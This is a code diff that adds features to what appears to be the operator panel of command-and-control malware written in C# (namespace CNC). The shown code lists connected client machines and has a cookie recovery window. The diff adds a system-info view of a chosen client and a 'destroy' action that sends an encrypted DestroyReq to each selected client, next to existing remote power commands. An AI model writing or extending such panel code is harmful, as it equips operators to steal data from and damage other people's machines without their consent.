@@ -133,6 +133,24 @@ namespace CNC
             cookieRecoveryWindow.Show();
         }
 
+        private void eventsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            EventManager eventManagerWindow = new EventManager();
+            eventManagerWindow.Show();
+        }
+
+        private void btnEvents_Click(object sender, EventArgs e)
+        {
+            EventManager eventManagerWindow = new EventManager();
+            eventManagerWindow.Show();
+        }
+
+        private void systemInfoToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SysInfo systemInfoWindow = new SysInfo((Client)clientListView.FocusedItem.Tag);
+            systemInfoWindow.Show();
+        }
+
         //Multi select BELOW
 
 
@@ -221,5 +239,15 @@ namespace CNC
                     Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
             }
         }
+
+        private void destroyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < clientListView.SelectedItems.Count; i++)
+            {
+                ((Client)clientListView.SelectedItems[i].Tag).Connection.SendObject<string>("DestroyReq",
+                    Cryptography.Encrypt(Guid.NewGuid().ToString()));
+            }
+        }
+
     }
 }
